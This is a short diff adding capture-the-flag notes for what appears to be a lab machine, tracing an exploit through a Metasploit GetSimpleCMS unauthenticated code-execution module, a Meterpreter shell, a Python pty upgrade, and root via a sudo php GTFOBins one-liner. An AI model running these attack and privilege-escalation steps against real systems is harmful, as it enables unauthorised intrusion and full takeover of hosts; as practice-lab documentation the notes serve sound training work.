@@ -1,0 +1,15 @@
+#Nmap enumeration of Target.
+#Apache Httpd 2.4.41 looks vulnerable
+$msfsconsole
+$search getsimplecms_unauth_code_exec
+#Set the options
+#Success, Meterpreter shell created
+$Shell
+$whoami - www-data
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+#user.txt flag located in mrb3n
+$sudo -l - (ALL : ALL) NOPASSWD: /usr/bin/php
+#Found sudo php shell on GTFObins utilizing the php binary
+CMD="/bin/sh"
+sudo php -r "system('$CMD');"
+#Root achieved
